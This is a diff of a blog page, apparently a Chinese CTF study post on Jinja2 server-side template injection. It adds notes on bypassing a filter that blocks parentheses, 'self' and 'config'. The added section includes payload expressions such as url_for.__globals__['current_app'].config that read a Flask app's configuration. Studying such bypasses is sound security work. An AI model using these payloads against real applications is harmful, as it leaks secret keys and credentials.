@@ -54,8 +54,9 @@
 <meta property="og:image" content="https://i.loli.net/2020/02/24/VhvMFANZCy7m9fz.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/24/WAyTklhRX4iYeOa.png">
 <meta property="og:image" content="https://i.loli.net/2020/03/02/zcjwfxstTpdqekr.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/06/FmYOAgdIZWf6iJ5.png">
 <meta property="article:published_time" content="2020-02-24T01:11:15.000Z">
-<meta property="article:modified_time" content="2020-03-02T02:39:10.765Z">
+<meta property="article:modified_time" content="2020-03-06T02:02:31.789Z">
 <meta property="article:author" content="glotozz">
 <meta property="article:tag" content="SSTI">
 <meta name="twitter:card" content="summary">
@@ -397,6 +398,18 @@
 <p><img src="https://i.loli.net/2020/03/02/zcjwfxstTpdqekr.png" alt="Snipaste_2020-03-02_10-36-51.png"></p>
 <p><code>open (&#39;&#39;)</code></p>
 <p>=======================分割线</p>
+<p>又逛到一篇bypass的文章</p>
+<p><a href="https://www.xmsec.cc/ssti-and-bypass-sandbox-in-jinja2/" target="_blank" rel="noopener">从SSTI到沙箱逃逸-jinja2</a></p>
+<img src="https://i.loli.net/2020/03/06/FmYOAgdIZWf6iJ5.png" alt="Snipaste_2020-03-06_09-57-36.png" style="zoom:50%;">
+
+<p> 需要获取的内容在 config 中，不能使用<code>(、)、self、config</code> </p>
+<p> 可用的上下文变量/函数如下<br><code>url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config</code> </p>
+<p>同时利用上下文获取 config 方式如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__globals__[&#39;current_app&#39;].config&#96; &#x2F; &#96;top.app.config</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[&#39;current_app&#39;].config</span><br><span class="line">get_flashed_messages.__globals__[&#39;current_app&#39;].config</span><br></pre></td></tr></table></figure>
+
+<p>============================分割线</p>
 <hr>
 <h4><span id="参考链接">参考链接：</span></h4><p> <a href="http://n3k0.icu/2018/09/10/Python-Sandbox-Excape/" target="_blank" rel="noopener">http://n3k0.icu/2018/09/10/Python-Sandbox-Excape/</a> </p>
 <p> <a href="https://lihuaiqiu.github.io/2019/07/07/SSTI模板注入-Jinja2/#more" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/#more</a></p>
